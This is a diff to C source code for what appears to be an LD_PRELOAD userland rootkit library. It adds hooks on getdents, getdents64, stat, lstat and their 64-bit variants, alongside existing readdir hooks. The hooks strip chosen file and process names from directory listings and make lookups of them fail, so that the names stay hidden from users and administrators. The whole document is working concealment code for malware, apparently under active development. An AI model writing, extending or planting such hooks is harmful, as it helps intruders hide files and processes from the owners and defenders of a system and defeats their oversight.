@@ -1,13 +1,16 @@
 #define _GNU_SOURCE
-#include <dirent.h>
 #include <dlfcn.h>
 #include <errno.h>
+#include <stdio.h>
+#include <ctype.h>
+#include <dirent.h>
 #include <stdlib.h>
 #include <string.h>
-#include <stdio.h>
 #include <unistd.h>
+#include <sys/stat.h>
 #include <sys/types.h>
-#include <ctype.h>
+#include <sys/syscall.h>
+#include <stdint.h>
 
 #define MAX_HIDDEN 32  // Increased to allow dynamic PID entries too
 
@@ -126,15 +129,186 @@ static int libhide(const char *name) {
     return 0;
 }
 
-// Hooked readdir() and readdir64()
+// Define the kernel dirent structures manually
+struct linux_dirent {
+    unsigned long  d_ino;
+    unsigned long  d_off;
+    unsigned short d_reclen;
+    char           d_name[];
+};
+
+struct linux_dirent64 {
+    uint64_t       d_ino;
+    int64_t        d_off;
+    unsigned short d_reclen;
+    unsigned char  d_type;
+    char           d_name[];
+};
+
+// Hook getdents and getdents64 syscalls using syscall wrappers
+static long (*orig_getdents)(unsigned int, struct linux_dirent *, unsigned int) = NULL;
+static long (*orig_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int) = NULL;
+
+// Wrapper for getdents syscall
+long getdents_syscall(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
+    if (!orig_getdents) {
+        *(void **)&orig_getdents = dlsym(RTLD_NEXT, "getdents");
+        if (!orig_getdents) return -ENOSYS;
+    }
+
+    long ret = orig_getdents(fd, dirp, count);
+    if (ret <= 0) return ret;
+
+    struct linux_dirent *d;
+    int bpos = 0;
+    long new_ret = ret;
+
+    while (bpos < ret) {
+        d = (struct linux_dirent *)((char *)dirp + bpos);
+        if (libhide(d->d_name)) {
+            // Remove this entry by shifting subsequent entries
+            int next_bpos = bpos + d->d_reclen;
+            if (next_bpos < ret) {
+                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
+            }
+            new_ret -= d->d_reclen;
+            ret = new_ret;
+        } else {
+            bpos += d->d_reclen;
+        }
+    }
+
+    return new_ret;
+}
+
+// Wrapper for getdents64 syscall
+long getdents64_syscall(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
+    if (!orig_getdents64) {
+        *(void **)&orig_getdents64 = dlsym(RTLD_NEXT, "getdents64");
+        if (!orig_getdents64) return -ENOSYS;
+    }
+
+    long ret = orig_getdents64(fd, dirp, count);
+    if (ret <= 0) return ret;
+
+    struct linux_dirent64 *d;
+    int bpos = 0;
+    long new_ret = ret;
+
+    while (bpos < ret) {
+        d = (struct linux_dirent64 *)((char *)dirp + bpos);
+        if (libhide(d->d_name)) {
+            // Remove this entry by shifting subsequent entries
+            int next_bpos = bpos + d->d_reclen;
+            if (next_bpos < ret) {
+                memmove((char *)dirp + bpos, (char *)dirp + next_bpos, ret - next_bpos);
+            }
+            new_ret -= d->d_reclen;
+            ret = new_ret;
+        } else {
+            bpos += d->d_reclen;
+        }
+    }
+
+    return new_ret;
+}
+
+// Override the actual syscalls with correct signatures
+ssize_t getdents(int fd, void *dirp, size_t count) {
+    return getdents_syscall(fd, (struct linux_dirent *)dirp, count);
+}
+
+ssize_t getdents64(int fd, void *dirp, size_t count) {
+    return getdents64_syscall(fd, (struct linux_dirent64 *)dirp, count);
+}
+
+// Stat hooks for tab complete and others
+static int (*orig_stat)(const char *, struct stat *) = NULL;
+static int (*orig_lstat)(const char *, struct stat *) = NULL;
+static int (*orig_fstat)(int, struct stat *) = NULL;
+static int (*orig_stat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_lstat64)(const char *, struct stat64 *) = NULL;
+static int (*orig_fstat64)(int, struct stat64 *) = NULL;
+
+static int should_hide_path(const char *path) {
+    const char *basename = strrchr(path, '/');
+    basename = basename ? basename + 1 : path;
+    return libhide(basename);
+}
+
+int stat(const char *path, struct stat *buf) {
+    if (!orig_stat) {
+        *(void **)&orig_stat = dlsym(RTLD_NEXT, "stat");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    return orig_stat(path, buf);
+}
+
+int lstat(const char *path, struct stat *buf) {
+    if (!orig_lstat) {
+        *(void **)&orig_lstat = dlsym(RTLD_NEXT, "lstat");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    return orig_lstat(path, buf);
+}
+
+int fstat(int fd, struct stat *buf) {
+    if (!orig_fstat) {
+        *(void **)&orig_fstat = dlsym(RTLD_NEXT, "fstat");
+    }
+    return orig_fstat(fd, buf);
+}
+
+int stat64(const char *path, struct stat64 *buf) {
+    if (!orig_stat64) {
+        *(void **)&orig_stat64 = dlsym(RTLD_NEXT, "stat64");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    return orig_stat64(path, buf);
+}
+
+int lstat64(const char *path, struct stat64 *buf) {
+    if (!orig_lstat64) {
+        *(void **)&orig_lstat64 = dlsym(RTLD_NEXT, "lstat64");
+    }
+    
+    if (should_hide_path(path)) {
+        errno = ENOENT;
+        return -1;
+    }
+    
+    return orig_lstat64(path, buf);
+}
+
+int fstat64(int fd, struct stat64 *buf) {
+    if (!orig_fstat64) {
+        *(void **)&orig_fstat64 = dlsym(RTLD_NEXT, "fstat64");
+    }
+    return orig_fstat64(fd, buf);
+}
+
+// Readdir hooks 
 static struct dirent *(*orig_readdir)(DIR *) = NULL;
 static struct dirent64 *(*orig_readdir64)(DIR *) = NULL;
 
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) {
-        union { void *p; struct dirent *(*f)(DIR *); } u;
-        u.p = dlsym(RTLD_NEXT, "readdir");
-        orig_readdir = u.f;
+        *(void **)&orig_readdir = dlsym(RTLD_NEXT, "readdir");
         if (!orig_readdir) {
             errno = ENOSYS;
             return NULL;
@@ -151,9 +325,7 @@ struct dirent *readdir(DIR *dirp) {
 
 struct dirent64 *readdir64(DIR *dirp) {
     if (!orig_readdir64) {
-        union { void *p; struct dirent64 *(*f)(DIR *); } u;
-        u.p = dlsym(RTLD_NEXT, "readdir64");
-        orig_readdir64 = u.f;
+        *(void **)&orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");
         if (!orig_readdir64) {
             errno = ENOSYS;
             return NULL;
